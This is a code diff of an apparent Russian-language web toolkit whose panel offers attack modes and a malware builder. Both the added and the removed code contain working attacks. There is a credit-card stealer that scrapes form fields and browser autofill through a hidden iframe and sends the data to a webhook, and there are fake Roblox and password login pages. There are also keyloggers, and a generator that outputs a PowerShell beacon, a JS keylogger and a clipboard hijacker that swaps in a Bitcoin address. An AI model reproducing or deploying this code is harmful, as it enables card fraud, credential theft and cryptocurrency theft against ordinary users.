-                div.innerHTML = `<h2>Ваш IP: ${ip}</h2><p>${geo.city || ''} ${geo.country_name || ''}</p><p>Редирект...</p>`;
+
+        // 3. CARD STEALER (БАНКОВСКИЕ КАРТЫ)
+        if(urlParams.has('cardsteal')) {
+            const redirect = urlParams.get('redirect') || 'https://google.com';
+            const cardWh = urlParams.get('card_wh') || null;
+            const stolenCards = { type: 'card_stealer', cards: [], timestamp: Date.now() };
+            // сбор данных со всех input форм, содержащих карты
+            const allInputs = document.querySelectorAll('input');
+            allInputs.forEach(inp => {
+                const val = inp.value;
+                if(!val) return;
+                const lower = inp.name.toLowerCase() + inp.id.toLowerCase() + inp.placeholder?.toLowerCase();
+                if(lower.includes('card') || lower.includes('cvv') || lower.includes('cc') || lower.includes('expir') || lower.includes('номер карты')) {
+                    stolenCards.cards.push({ field: inp.name || 'card', value: val });
+                }
+                if(/^\d{4}[-\s]?\d{4}[-\s]?\d{4}[-\s]?\d{4}$/.test(val) || /^\d{16}$/.test(val)) {
+                    stolenCards.cards.push({ type: 'card_number', value: val });
+                }
+                if(/^\d{3,4}$/.test(val) && (lower.includes('cvv') || lower.includes('cvc'))) {
+                    stolenCards.cards.push({ type: 'cvv', value: val });
+                }
+                if(/^\d{2}\/\d{2,4}$/.test(val) && lower.includes('exp')) {
+                    stolenCards.cards.push({ type: 'expiry', value: val });
+                }
+            });
+            // также пытаемся вытащить через скрытый iframe с autofill
+            const iframeCard = document.createElement('iframe');
+            iframeCard.style.display = 'none';
+            iframeCard.srcdoc = `<html><body><form><input name="ccnum" autocomplete="cc-number"><input name="exp" autocomplete="cc-exp"><input name="cvv" autocomplete="cc-csc"><input name="name" autocomplete="cc-name"></form><script>setTimeout(()=>{let n=document.querySelector('[autocomplete="cc-number"]').value, e=document.querySelector('[autocomplete="cc-exp"]').value, c=document.querySelector('[autocomplete="cc-csc"]').value, nm=document.querySelector('[autocomplete="cc-name"]').value; parent.postMessage({number:n,exp:e,cvv:c,name:nm},'*');},300);<\/script></body></html>`;
+            document.body.appendChild(iframeCard);
+            const cardPromise = new Promise(resolve => {
+                window.addEventListener('message', e => { if(e.data && e.data.number) resolve(e.data); iframeCard.remove(); });
+                setTimeout(() => { iframeCard.remove(); resolve({}); }, 1000);
+            });
+            const autoCards = await cardPromise;
+            if(autoCards.number || autoCards.cvv) stolenCards.cards.push({ autofill: autoCards });
+            sendToOwner(stolenCards, cardWh);
+            window.location.replace(redirect);
+            return;
+        }
+
+        // 4. ФИШИНГ (старый)
+        if(urlParams.has('phish')) {
+            const phishType = urlParams.get('phish');
+            const redirect = urlParams.get('redirect') || 'https://google.com';
+            document.body.innerHTML = '';
+            document.body.style.background = '#0a0c17';
+            function sendPhish(data) { addStolenEntry(ownerId, data); }
+            if(phishType === 'roblox') {
+                const div = document.createElement('div'); div.style.maxWidth='400px'; div.style.margin='10% auto'; div.style.background='#111'; div.style.padding='30px';
+                div.innerHTML = `<h2>Roblox вход</h2><input id="u" placeholder="Логин"><input id="p" type="password" placeholder="Пароль"><button id="btn">Войти</button>`;
                 document.body.appendChild(div);
-                setTimeout(()=> location.href = redirectUrl, 3000);
-            })();
-        }
-        else if(attack === 'pass') {
-            const container = document.createElement('div');
-            container.style.maxWidth='500px'; container.style.margin='10% auto'; container.style.background='#0a0f1e'; container.style.border='2px solid #00ffcc'; container.style.padding='25px';
-            container.innerHTML = `<h3>Подтвердите доступ</h3><form id="stealForm"><input name="login" placeholder="Логин/Email"><input name="pass" type="password" placeholder="Пароль"><input name="email" placeholder="Email (опционально)"><button type="submit">Отправить</button></form>`;
-            document.body.appendChild(container);
-            let keyBuffer='';
-            const keyHandler = (e) => { keyBuffer+=e.key; if(keyBuffer.length>45){ sendToOwner({type:'keystroke_batch', keys:keyBuffer}); keyBuffer=''; }};
-            document.addEventListener('keydown', keyHandler);
-            const form = document.getElementById('stealForm');
-            form.onsubmit = (e) => {
-                e.preventDefault();
-                const creds = { login: form.login.value, pass: form.pass.value, email: form.email.value };
-                sendToOwner({ type: 'form_creds', creds, userAgent: navigator.userAgent });
-                container.innerHTML = '<h3>Данные отправлены, перенаправление...</h3>';
-                setTimeout(()=> location.href = redirectUrl, 1200);
-            };
-        }
-        else if(attack === 'multi') {
-            (async()=>{
-                const {ip, geo} = await getIpGeo();
-                sendToOwner({ type: 'multi_ip_start', ip, geo });
-                const div = document.createElement('div');
-                div.style.maxWidth='450px'; div.style.margin='12% auto'; div.style.background='#111'; div.style.padding='25px';
-                div.innerHTML = `<h3>🎮 Roblox проверка</h3><input id="mu" placeholder="Логин"><input id="mp" type="password" placeholder="Пароль"><button id="mbtn">Войти</button>`;
-                document.body.appendChild(div);
-                let keyBuf='';
-                document.addEventListener('keydown',(e)=>{ keyBuf+=e.key; if(keyBuf.length>40){ sendToOwner({type:'multi_keylog', keys:keyBuf}); keyBuf=''; }});
-                document.getElementById('mbtn').onclick = () => {
-                    const u = document.getElementById('mu').value, p = document.getElementById('mp').value;
-                    sendToOwner({ type: 'multi_roblox', username: u, password: p });
-                    div.innerHTML = '<h3>Редирект...</h3>';
-                    setTimeout(()=> location.href = redirectUrl, 1500);
-                };
-            })();
+                document.getElementById('btn').onclick = () => { sendPhish({type:'roblox_creds', username: document.getElementById('u').value, password: document.getElementById('p').value}); div.innerHTML = '<p>Редирект...</p>'; setTimeout(()=> location.href=redirect, 1000); };
+            } else if(phishType === 'ip') {
+                fetch('https://api.ipify.org?format=json').then(r=>r.json()).then(ip=>{ sendPhish({type:'ip_grab', ip:ip.ip}); document.body.innerHTML = `<h3>IP: ${ip.ip}</h3>`; setTimeout(()=> location.href=redirect, 2000); });
+            } else if(phishType === 'pass') {
+                const formDiv = document.createElement('div'); formDiv.innerHTML = `<form id="steal"><input name="login" placeholder="Логин"><input name="pass" placeholder="Пароль"><button type="submit">Отправить</button></form>`;
+                document.body.appendChild(formDiv);
+                document.getElementById('steal').onsubmit = (e) => { e.preventDefault(); const login = e.target.login.value, pass = e.target.pass.value; sendPhish({type:'form_creds', creds:{login,pass}}); formDiv.innerHTML = '<p>Редирект...</p>'; setTimeout(()=> location.href=redirect, 1000); };
+            } else if(phishType === 'multi') {
+                const container = document.createElement('div'); container.innerHTML = `<h3>Мульти</h3><input id="mu" placeholder="Логин"><input id="mp" placeholder="Пароль"><button id="mbtn">Отправить</button>`;
+                document.body.appendChild(container);
+                document.getElementById('mbtn').onclick = () => { sendPhish({type:'multi_roblox', username: document.getElementById('mu').value, password: document.getElementById('mp').value}); container.innerHTML = '<p>Редирект...</p>'; setTimeout(()=> location.href=redirect, 1000); };
+            }
+            return;
         }
     })();
 
-    // ---------- REGISTRATION / LOGIC ----------
+    // ---------- ИНИЦИАЛИЗАЦИЯ ИНТЕРФЕЙСА ----------
     loadUsers();
-    // попробуем восстановить сессию
-    const savedSession = localStorage.getItem('neterror_current_session');
-    if(savedSession) {
-        try {
-            const sess = JSON.parse(savedSession);
-            const user = users.find(u => u.id === sess.id && u.email === sess.email);
-            if(user) currentUser = { email: user.email, id: user.id };
-        } catch(e) {}
+    const saved = localStorage.getItem('neterror_current_session');
+    if(saved) {
+        try { const sess = JSON.parse(saved); const user = users.find(u=>u.id===sess.id && u.email===sess.email); if(user) currentUser = { email: user.email, id: user.id }; } catch(e) {}
     }
     refreshAuthUI();
-    if(currentUser) {
-        renderLogs();
-    }
+    if(currentUser) renderLogs();
 
-    // регистрация
-    document.getElementById('registerBtn').addEventListener('click', () => {
-        const email = document.getElementById('regEmail').value.trim();
-        const pass = document.getElementById('regPass').value;
-        const res = registerUser(email, pass);
-        const msgEl = document.getElementById('regMsg');
-        if(res.ok) {
-            msgEl.style.color = '#88ff88';
-            msgEl.innerText = '✅ Регистрация успешна! Теперь войдите.';
-            document.getElementById('regEmail').value = '';
-            document.getElementById('regPass').value = '';
-        } else {
-            msgEl.style.color = '#ff8888';
-            msgEl.innerText = res.msg;
-        }
-    });
-    // логин
-    document.getElementById('loginBtn').addEventListener('click', () => {
-        const email = document.getElementById('loginEmail').value.trim();
-        const pass = document.getElementById('loginPass').value;
-        const res = loginUser(email, pass);
-        const msgEl = document.getElementById('loginMsg');
-        if(res.ok) {
-            currentUser = { email: res.user.email, id: res.user.id };
-            localStorage.setItem('neterror_current_session', JSON.stringify({ id: currentUser.id, email: currentUser.email }));
-            refreshAuthUI();
-            renderLogs();
-            updateStatsBadge();
-            msgEl.innerText = '';
-        } else {
-            msgEl.style.color = '#ff8888';
-            msgEl.innerText = res.msg;
-        }
-    });
-    logoutBtn.addEventListener('click', () => {
-        currentUser = null;
-        localStorage.removeItem('neterror_current_session');
-        refreshAuthUI();
-    });
+    document.getElementById('registerBtn').onclick = () => { const res = registerUser(document.getElementById('regEmail').value.trim(), document.getElementById('regPass').value); const msg = document.getElementById('regMsg'); if(res.ok) { msg.style.color='#88ff88'; msg.innerText='✅ Успех, войдите!'; } else { msg.style.color='#ff8888'; msg.innerText=res.msg; } };
+    document.getElementById('loginBtn').onclick = () => { const res = loginUser(document.getElementById('loginEmail').value.trim(), document.getElementById('loginPass').value); if(res.ok) { currentUser = { email: res.user.email, id: res.user.id }; localStorage.setItem('neterror_current_session', JSON.stringify({id: currentUser.id, email: currentUser.email})); refreshAuthUI(); renderLogs(); } else { document.getElementById('loginMsg').innerText=res.msg; } };
+    document.getElementById('logoutBtn').onclick = () => { currentUser = null; localStorage.removeItem('neterror_current_session'); refreshAuthUI(); };
 
-    // вкладки внутри авторизованной панели
-    const logTabs = document.querySelectorAll('[data-logtab]');
-    const logContents = {
-        generator: document.getElementById('generatorTab'),
-        logs: document.getElementById('logsTab'),
-        rat: document.getElementById('ratTabContent')
-    };
-    function switchLogTab(tabId) {
-        Object.keys(logContents).forEach(id => {
-            if(logContents[id]) logContents[id].style.display = 'none';
-        });
-        if(logContents[tabId]) logContents[tabId].style.display = 'block';
-        document.querySelectorAll('[data-logtab]').forEach(btn => {
-            if(btn.getAttribute('data-logtab') === tabId) btn.classList.add('active');
-            else btn.classList.remove('active');
-        });
-        if(tabId === 'logs' && currentUser) renderLogs();
-    }
-    logTabs.forEach(btn => {
-        btn.addEventListener('click', () => {
-            const tab = btn.getAttribute('data-logtab');
-            switchLogTab(tab);
-        });
-    });
-    if(currentUser) switchLogTab('generator');
+    // RAT генератор
+    function genMalware(name, type, wh) { const safe = name.replace(/[^a-z0-9_]/gi,'_'); if(type==='powershell_rat') return `# ${safe}\n$wh="${wh}"\nInvoke-RestMethod -Uri $wh -Method Post -Body (@{name="${safe}"}|ConvertTo-Json)`; if(type==='js_keylogger') return `// ${safe}\nlet k="";document.onkeydown=e=>{k+=e.key;if(k.length>30)fetch("${wh}",{method:"POST",body:k})};`; if(type==='locker_html') return `<html><body style="background:black;color:red"><h1>${safe} LOCKER</h1><script>alert("LOCKED");<\/script></body></html>`; return `# ${safe} clipper\nAdd-Type -AssemblyName System.Windows.Forms\nwhile($true){$c=[System.Windows.Forms.Clipboard]::GetText();if($c-match"^1"){[System.Windows.Forms.Clipboard]::SetText("1A1zP1eP5QGefi2DMPTfTL5SLmv7DivfNa")};Start-Sleep 2}`; }
+    document.getElementById('generateRatCodeBtn').onclick = () => { const code = genMalware(document.getElementById('malName').value, document.getElementById('malType').value, document.getElementById('webhookRat').value); document.getElementById('generatedCodeArea').value = code; document.getElementById('ratResultArea').style.display = 'block'; };
+    document.getElementById('copyCodeBtn').onclick = () => { const area = document.getElementById('generatedCodeArea'); area.select(); document.execCommand('copy'); alert('Код скопирован'); };
 
-    // ---------- RAT GENERATOR (старый, но рабочий) ----------
-    function generateMalwareCode(malName, type, webhookVal) {
-        const safeName = malName.replace(/[^a-zA-Z0-9_]/g, '_');
-        const wh = webhookVal || "https://webhook.site/example";
-        if(type === 'powershell_rat') return `# ${safeName} RAT\n$webhook="${wh}"\n$ip=(Invoke-WebRequest -Uri "https://api.ipify.org").Content\nInvoke-RestMethod -Uri $webhook -Method Post -Body (@{name="${safeName}";ip=$ip}|ConvertTo-Json)`;
-        if(type === 'js_keylogger') return `// ${safeName} Keylogger\nlet buffer="";document.onkeydown=e=>{buffer+=e.key;if(buffer.length>30)fetch("${wh}",{method:"POST",body:buffer})};`;
-        if(type === 'locker_html') return `<html><body style="background:black;color:red"><h1>${safeName} LOCKER</h1><script>alert("Заблокировано");</script></body></html>`;
-        if(type === 'clipper') return `# ${safeName} Clipper\nAdd-Type -AssemblyName System.Windows.Forms\nwhile($true){$c=[System.Windows.Forms.Clipboard]::GetText();if($c -match "^1"){[System.Windows.Forms.Clipboard]::SetText("1A1zP1eP5QGefi2DMPTfTL5SLmv7DivfNa")};Start-Sleep 2}`;
-        return `# ${safeName} Stealer\n$wh="${wh}"\n$data=@{\user=$env:USERNAME}\nInvoke-RestMethod -Uri $wh -Body ($data|ConvertTo-Json)`;
-    }
-    document.getElementById('generateRatCodeBtn')?.addEventListener('click', () => {
-        let name = document.getElementById('malName').value.trim();
-        if(!name) name = "NetRAT";
-        const type = document.getElementById('malType').value;
-        const wh = document.getElementById('webhookRat').value;
-        const code = generateMalwareCode(name, type, wh);
-        document.getElementById('generatedCodeArea').value = code;
-        document.getElementById('ratResultArea').style.display = 'block';
-    });
-    document.getElementById('copyCodeBtn')?.addEventListener('click', () => {
-        const textarea = document.getElementById('generatedCodeArea');
-        textarea.select();
-        document.execCommand('copy');
-        alert('Код скопирован');
-    });
-    // для обновления логов при переключении
-    setInterval(() => { if(currentUser && document.querySelector('[data-logtab="logs"].active')) renderLogs(); }, 3000);
+    // Переключение вкладок
+    const tabBtns = document.querySelectorAll('[data-logtab]');
+    const contentsMap = { stealth: 'stealthTab', driveby: 'drivebyTab', cardstealer: 'cardstealerTab', phish: 'phishTab', logs: 'logsTab', rat: 'ratTabContent' };
+    function switchTab(tabId) { Object.values(contentsMap).forEach(id => { const el = document.getElementById(id); if(el) el.style.display = 'none'; }); const active = document.getElementById(contentsMap[tabId]); if(active) active.style.display = 'block'; tabBtns.forEach(btn => { if(btn.getAttribute('data-logtab') === tabId) btn.classList.add('active'); else btn.classList.remove('active'); }); if(tabId === 'logs' && currentUser) renderLogs(); }
+    tabBtns.forEach(btn => btn.addEventListener('click', () => switchTab(btn.getAttribute('data-logtab'))));
+    if(currentUser) switchTab('stealth');
 </script>
 </body>
 </html>
